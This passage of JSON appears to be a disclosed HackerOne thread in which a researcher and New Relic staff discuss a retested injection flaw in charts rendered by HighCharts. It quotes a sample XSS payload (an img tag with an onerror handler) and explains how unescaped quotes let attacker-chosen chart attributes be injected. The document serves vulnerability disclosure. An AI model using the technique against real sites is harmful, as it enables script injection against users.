wrong.","automated_response":false,"created_at":"2019-09-18T22:48:56.684Z","updated_at":"2019-09-18T22:56:39.672Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5844325,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"One of these days I'll be able to actually test this report. When I tested a URL, the note errored and clicking did nothing. I'm glad we have you here to double check our work!","automated_response":false,"created_at":"2019-09-19T15:34:44.388Z","updated_at":"2019-09-19T15:34:44.388Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5844497,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jmcaleer,\n\nExcuse me, do you always award a bonuses for the retests like this one? It takes time and so I want to know whether it’s better to spend it hunting for new bugs or retesting is also ok? :) This case is really hard to be digged in after few months after discovering. I’ve got some bonuses after retests of course, but here it is my second retest already so it is not obvious.","automated_response":false,"created_at":"2019-09-19T15:55:27.409Z","updated_at":"2019-09-19T15:55:27.409Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5844611,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I mean the retest is easy and can be done fast, but finding a bypass can be really non-trivial.","automated_response":false,"created_at":"2019-09-19T16:15:05.320Z","updated_at":"2019-09-19T16:15:05.320Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5844615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@skavans,\n\nThat's an excellent question! We would love for you to retest our tickets once we resolve them. As with any ticket, we will determine if the vulnerability from the retest is an acceptable risk. Hopefully, in the resolve we will tell you if our tests find any acceptable risk, but some things can fall through the cracks when we're testing so I can't necessarily guarantee we will tell you all the acceptable risks nor guarantee you will find a vulnerability to award a bonus for. \n\nHowever, you normally find valid \"unacceptable\" vulnerabilities, I would assume we would probably award you a bonus for retests (even if it's second or third). When I reproduce your test case, I'll determine if it's an actual issue or not. It sounds like it is, so I'll probably be awarding a second bonus.\n\nI hope that's somewhat resolves your concerns.","automated_response":false,"created_at":"2019-09-19T16:15:50.566Z","updated_at":"2019-09-19T16:15:50.566Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5845430,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"{F586886}","automated_response":false,"created_at":"2019-09-19T17:42:38.444Z","updated_at":"2019-09-19T17:42:38.444Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"625.0","attachments":[{"id":586886,"filename":"burn_money.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vScNAX7wXsF5PMZTXBGrGpV8?response-content-disposition=attachment%3B%20filename%3D%22burn_money.gif%22%3B%20filename%2A%3DUTF-8%27%27burn_money.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150743Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=686a1b511ddf3c62acaa79428b6fb9c8f2395afb93867930690df77cce307465"}],"genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"skavans","url":"/skavans"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5845902,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot @jmcaleer!","automated_response":false,"created_at":"2019-09-19T19:00:01.894Z","updated_at":"2019-09-19T19:00:01.894Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5846112,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just to be clear, this seems more like a clickjacking or open redirect, and we seem to have left XSS. You said the `data:` can be used, but how does that get XSS?","automated_response":false,"created_at":"2019-09-19T19:35:00.241Z","updated_at":"2019-09-19T19:40:30.831Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5847306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jmcaleer\n\nTechnically, the `data:` URI allows to execute JS, but with no access to user cookies (the browser considers the JS located at `data:` as belonging to different origin). So, actually, this is not really an XSS, it is rather an open redirect, because the only real impact an attacker can exploit is to redirect a victim somewhere.\n\nI think the actual type of this issue is `code injection` rather than others, because attacker can at least inject a malicious styled link.\n\nI mentioned that the XSS is could be possible exploited because\n\u003e the arbitrary chart parameters still could be injected into the server response\n\nThe HighCharts API is quite complicated and allows the user to change the chart behavior in many ways, including the arbitrary HTML-rendering inside different places (e.g. labels, caption etc.). This is what I've used before to perform the XSS w/o user interaction. You can navigate to this [API docs](https://api.highcharts.com/highcharts/) and search for `useHTML` above the classes list for instance.\n\nAfter my little yesterday investigation, I've noticed, that the tags I used before (like `\u003cimg src=x onerror=alert()\u003e`, are removed from the response now. Thus, it is not possible now to use my previous payload combining the `useHTML` chart parameter and the tags with malicious event listener inside. But, I've noticed also that there is some (different from the ones before) response JSON places, where the tags are not removed but just encoded. So it needs deep digging to investigate the XSS possibility after the previous (actually incorrect) fix. The simplest way is fixed, but not a root cause. So, having the complicated API and unstable tags filtering, I think that the XSS may be still possible.\n\nI just don't know if it is really necessary to spend a time for building such payload, or you can just explain to the dev team, that the arbitrary HighCharts attributes are still could be injected into chart JSON (using my yesterday poc with a simple link) and ask them to fix a bug properly (do not unescape `\u0026quot;` and thus do not allow attacker to inject arbitrary HighCharts JSON attributes)?\n\nJust to be more clear, the vulnerability root cause is that the server should produce a JSON for a chart with some fixed fields like title, subtitile, series and so on. But, using the `\u0026quot;` unescaping bug, I can add extra fields into this JSON (like the \"credits\", I've used at my yesterday payload), which will be processed by HighChartsJS and so can turn many undesirable HighCharts API features (like HTML rendering instead using just SVG) on.\n\nIf you can just change the issue type to the code injection and the issue will be fixed after that, I think it is a good way.","automated_response":false,"created_at":"2019-09-19T20:29:06.391Z","updated_at":"2019-09-19T20:29:06.391Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6793424,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @skavans,\n\nWe've finalized our plans to end of life the Notes feature. You should no longer be able to reproduce this issue.\n\nThank you for your help in keeping New Relic and our customers secure!","automated_response":false,"created_at":"2020-01-16T18:01:20.607Z","updated_at":"2020-01-16T18:01:20.607Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skavans","url":"/skavans"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8902565,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-11T09:35:13.456Z","updated_at":"2020-08-11T09:35:13.456Z","first_to_agree":true,"actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8923178,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can we disclose this?","automated_response":false,"created_at":"2020-08-13T08:31:01.200Z","updated_at":"2020-08-13T08:31:01.200Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8926680,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-13T13:27:02.221Z","updated_at":"2020-08-13T13:27:02.221Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8926681,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-13T13:27:02.376Z","updated_at":"2020-08-13T13:27:02.376Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}